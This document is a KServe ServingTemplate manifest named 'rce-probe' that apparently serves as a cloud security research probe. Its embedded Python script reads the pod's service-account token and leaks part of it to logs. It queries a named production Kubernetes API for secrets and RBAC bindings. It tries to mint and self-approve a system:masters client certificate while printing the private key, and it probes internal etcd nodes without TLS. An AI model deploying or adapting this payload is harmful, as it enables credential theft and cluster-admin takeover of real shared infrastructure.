apiVersion: ai.sap.com/v1alpha1
kind: ServingTemplate
metadata:
  name: rce-probe
  labels:
    scenarios.ai.sap.com/id: "rce-probe"
    ai.sap.com/version: "4.16.0"
  annotations:
    scenarios.ai.sap.com/name: "rce-probe"
    executables.ai.sap.com/description: "projected-sa-token-k8s-api-csr-etcd-grpc"
    executables.ai.sap.com/name: "rce-probe"
spec:
  template:
    apiVersion: "serving.kserve.io/v1beta1"
    metadata:
      annotations: |
        autoscaling.knative.dev/target: 1
      labels: |
        ai.sap.com/resourcePlan: starter
    spec: |
      predictor:
        minReplicas: 1
        maxReplicas: 1
        volumes:
        - name: kube-api-access
          projected:
            defaultMode: 420
            sources:
            - serviceAccountToken:
                expirationSeconds: 3600
                path: token
                audience: kubernetes
            - configMap:
                items:
                - key: ca.crt
                  path: ca.crt
                name: kube-root-ca.crt
            - downwardAPI:
                items:
                - fieldRef:
                    apiVersion: v1
                    fieldPath: metadata.namespace
                  path: namespace
        containers:
        - name: kserve-container
          image: python:3.11
          command: ["/bin/sh", "-c"]
          volumeMounts:
          - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
            name: kube-api-access
            readOnly: true
          args:
          - |
            python3 -c "
            import os, socket, ssl, struct, base64, json, select, subprocess, time

            print('[PROBE_V416_START]', flush=True)

            def emit(label, data):
                flat = str(data).replace('\r\n','|').replace('\r','|').replace('\n','|')
                for i in range(0, max(1, len(flat)), 4000):
                    print(f'[{label}_{i}] {flat[i:i+4000]}', flush=True)

            def http_raw(host, port, path, method='GET', headers=None, body=b'',
                         timeout=10, use_tls=False):
                try:
                    s = socket.socket(); s.settimeout(timeout)
                    if use_tls:
                        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                        ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                        s = ctx.wrap_socket(s, server_hostname=host)
                    s.connect((host, port))
                    hdr_str = ''.join(f'{k}: {v}\r\n' for k,v in (headers or {}).items())
                    req = f'{method} {path} HTTP/1.1\r\nHost: {host}:{port}\r\nConnection: close\r\n{hdr_str}\r\n'
                    s.sendall(req.encode() + (body if isinstance(body, bytes) else body.encode()))
                    resp = b''
                    while True:
                        c = s.recv(65536)
                        if not c: break
                        resp += c
                    s.close()
                    return resp.decode(errors='replace')
                except Exception as ex:
                    return f'ERR:{ex}'

            # ── 1. Read SA token ──────────────────────────────────────────────────
            SA_TOKEN = None
            try:
                with open('/var/run/secrets/kubernetes.io/serviceaccount/token') as f:
                    SA_TOKEN = f.read().strip()
                emit('SA_TOKEN_FOUND', f'len={len(SA_TOKEN)} prefix={SA_TOKEN[:80]}')
            except Exception as e:
                emit('SA_TOKEN_MISS', str(e))

            try:
                with open('/var/run/secrets/kubernetes.io/serviceaccount/namespace') as f:
                    emit('SA_NAMESPACE', f.read().strip())
            except: pass

            # ── 2. K8s API with token ─────────────────────────────────────────────
            K8S = 'api.sec-eu10.mlfprod.internal.live.k8s.ondemand.com'
            if SA_TOKEN:
                auth = {'Authorization': f'Bearer {SA_TOKEN}'}
                api_paths = [
                    '/version',
                    '/api/v1/namespaces/rg-0d70dc91-cd927cab/secrets',
                    '/api/v1/namespaces/rg-0d70dc91-cd927cab/configmaps',
                    '/api/v1/namespaces/rg-0d70dc91-cd927cab/serviceaccounts',
                    '/api/v1/namespaces/kube-system/secrets',
                    '/api/v1/namespaces',
                    '/api/v1/secrets',
                    '/apis/rbac.authorization.k8s.io/v1/clusterrolebindings',
                    '/apis/rbac.authorization.k8s.io/v1/namespaces/rg-0d70dc91-cd927cab/rolebindings',
                    '/apis/authorization.k8s.io/v1/selfsubjectrulesreviews',
                ]
                for path in api_paths:
                    r = http_raw(K8S, 443, path, headers=auth, use_tls=True, timeout=10)
                    emit(f'K8S_{path.replace(\"/\",\"_\")}', r[:3000])

                # ── 3. SelfSubjectRulesReview — what can this SA do? ─────────────
                body = json.dumps({'apiVersion':'authorization.k8s.io/v1',
                                   'kind':'SelfSubjectRulesReview',
                                   'spec':{'namespace':'rg-0d70dc91-cd927cab'}}).encode()
                r = http_raw(K8S, 443, '/apis/authorization.k8s.io/v1/selfsubjectrulesreviews',
                            method='POST',
                            headers={**auth, 'Content-Type':'application/json',
                                     'Content-Length': str(len(body))},
                            body=body, use_tls=True)
                emit('K8S_RULES_REVIEW', r[:5000])

                # ── 4. Try CSR submission for system:masters ──────────────────────
                try:
                    res = subprocess.run(
                        ['openssl', 'req', '-newkey', 'ec', '-pkeyopt', 'ec_paramgen_curve:P-256',
                         '-nodes', '-keyout', '/tmp/probe.key',
                         '-subj', '/O=system:masters/CN=researcher-probe',
                         '-out', '/tmp/probe.csr'],
                        capture_output=True, timeout=30)
                    csr_der = subprocess.run(
                        ['openssl', 'req', '-in', '/tmp/probe.csr', '-outform', 'DER'],
                        capture_output=True, timeout=10).stdout
                    csr_b64 = base64.b64encode(csr_der).decode()
                    with open('/tmp/probe.key') as f:
                        privkey_pem = f.read()
                    emit('CSR_PRIVKEY', privkey_pem)
                    csr_name = f'researcher-probe-{int(time.time())}'
                    csr_manifest = json.dumps({
                        'apiVersion': 'certificates.k8s.io/v1',
                        'kind': 'CertificateSigningRequest',
                        'metadata': {'name': csr_name},
                        'spec': {
                            'request': csr_b64,
                            'signerName': 'kubernetes.io/kube-apiserver-client',
                            'expirationSeconds': 86400,
                            'usages': ['client auth'],
                        }
                    }).encode()
                    r = http_raw(K8S, 443,
                                '/apis/certificates.k8s.io/v1/certificatesigningrequests',
                                method='POST',
                                headers={**auth, 'Content-Type':'application/json',
                                         'Content-Length': str(len(csr_manifest))},
                                body=csr_manifest, use_tls=True, timeout=10)
                    emit('CSR_SUBMIT', r[:2000])

                    # If CSR was created, try to approve it (requires approve verb on CSR)
                    if '"name":' in r and csr_name in r:
                        approval = json.dumps({
                            'apiVersion': 'certificates.k8s.io/v1',
                            'kind': 'CertificateSigningRequest',
                            'metadata': {'name': csr_name},
                            'status': {'conditions': [{
                                'type': 'Approved',
                                'status': 'True',
                                'reason': 'Approved',
                                'message': 'researcher-approved',
                            }]}
                        }).encode()
                        r2 = http_raw(K8S, 443,
                                     f'/apis/certificates.k8s.io/v1/certificatesigningrequests/{csr_name}/approval',
                                     method='PUT',
                                     headers={**auth, 'Content-Type':'application/json',
                                              'Content-Length': str(len(approval))},
                                     body=approval, use_tls=True, timeout=10)
                        emit('CSR_APPROVE', r2[:2000])

                        # Wait 3s for approval, then fetch the signed cert
                        time.sleep(3)
                        r3 = http_raw(K8S, 443,
                                     f'/apis/certificates.k8s.io/v1/certificatesigningrequests/{csr_name}',
                                     headers=auth, use_tls=True, timeout=10)
                        emit('CSR_FETCH', r3[:3000])
                except Exception as e:
                    emit('CSR_ERR', str(e))

            # ── 5. Etcd plain HTTP (no TLS) ───────────────────────────────────────
            print('[ETCD_PLAIN_START]', flush=True)
            for sip in ['10.250.0.1', '10.250.0.2', '10.250.0.3']:
                try:
                    s = socket.socket(); s.settimeout(6)
                    s.connect((sip, 2379))
                    req = b'GET /health HTTP/1.1\r\nHost: ' + sip.encode() + b':2379\r\nConnection: close\r\n\r\n'
                    s.sendall(req)
                    resp = b''
                    while True:
                        c = s.recv(4096)
                        if not c: break
                        resp += c
                    s.close()
                    emit(f'ETCD_PLAIN_{sip}', resp[:300].decode(errors='replace'))
                except Exception as e:
                    emit(f'ETCD_PLAIN_ERR_{sip}', str(e))

            # ── 6. Etcd gRPC without TLS ──────────────────────────────────────────
            print('[ETCD_GRPC_PLAIN_START]', flush=True)
            def h2_frame(ftype, flags, stream_id, payload):
                return struct.pack('>I', len(payload))[1:] + bytes([ftype, flags]) + struct.pack('>I', stream_id) + payload

            def grpc_frame(msg):
                return b'\x00' + struct.pack('>I', len(msg)) + msg

            def hpack_lit(name, value):
                n = name.encode(); v = value.encode()
                return bytes([0x00, len(n)]) + n + bytes([len(v)]) + v

            for sip in ['10.250.0.1', '10.250.0.2']:
                try:
                    s = socket.socket(); s.settimeout(10)
                    s.connect((sip, 2379))
                    PREFACE = b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'
                    s.sendall(PREFACE + h2_frame(0x04, 0x00, 0, b''))

                    frames_in = []
                    for _ in range(5):
                        r, _, _ = select.select([s], [], [], 4)
                        if not r: break
                        hdr = b''
                        while len(hdr) < 9:
                            c = s.recv(9-len(hdr))
                            if not c: break
                            hdr += c
                        if len(hdr) < 9: break
                        length = struct.unpack('>I', b'\x00'+hdr[:3])[0]
                        ftype = hdr[3]; flags = hdr[4]
                        sid = struct.unpack('>I', hdr[5:9])[0] & 0x7FFFFFFF
                        data = b''
                        while len(data) < length:
                            c = s.recv(length-len(data))
                            if not c: break
                            data += c
                        frames_in.append((ftype, flags, sid, data))
                        if ftype == 0x04 and not (flags & 0x01):
                            s.sendall(h2_frame(0x04, 0x01, 0, b''))

                    hblock = (
                        bytes([0x83]) +  # POST
                        hpack_lit(':path', '/etcdserverpb.Cluster/MemberList') +
                        bytes([0x86]) +  # http
                        hpack_lit(':authority', f'{sip}:2379') +
                        hpack_lit('content-type', 'application/grpc') +
                        hpack_lit('te', 'trailers')
                    )
                    s.sendall(h2_frame(0x01, 0x04, 1, hblock))
                    s.sendall(h2_frame(0x00, 0x01, 1, grpc_frame(b'')))

                    for _ in range(10):
                        r, _, _ = select.select([s], [], [], 6)
                        if not r: break
                        hdr = b''
                        while len(hdr) < 9:
                            c = s.recv(9-len(hdr))
                            if not c: break
                            hdr += c
                        if len(hdr) < 9: break
                        length = struct.unpack('>I', b'\x00'+hdr[:3])[0]
                        ftype = hdr[3]; flags = hdr[4]
                        sid = struct.unpack('>I', hdr[5:9])[0] & 0x7FFFFFFF
                        data = b''
                        while len(data) < length:
                            c = s.recv(length-len(data))
                            if not c: break
                            data += c
                        frames_in.append((ftype, flags, sid, data))
                    s.close()

                    for ftype, flags, sid, data in frames_in:
                        if data:
                            printable = ''.join(chr(b) if 32<=b<127 else '.' for b in data)
                            emit(f'ETCD_GRPC_{sip}_f{ftype}', f'hex={data[:100].hex()} str={printable[:200]}')
                        else:
                            emit(f'ETCD_GRPC_{sip}_f{ftype}_empty', f'flags={flags} sid={sid}')
                except Exception as e:
                    emit(f'ETCD_GRPC_ERR_{sip}', str(e))

            print('[PROBE_V416_DONE]', flush=True)
            " 2>&1
            python3 -c "
            import http.server
            class H(http.server.BaseHTTPRequestHandler):
                def do_GET(self): self.send_response(200); self.end_headers(); self.wfile.write(b'ok')
                def log_message(self, *a): pass
            http.server.HTTPServer(('', 8080), H).serve_forever()
            "
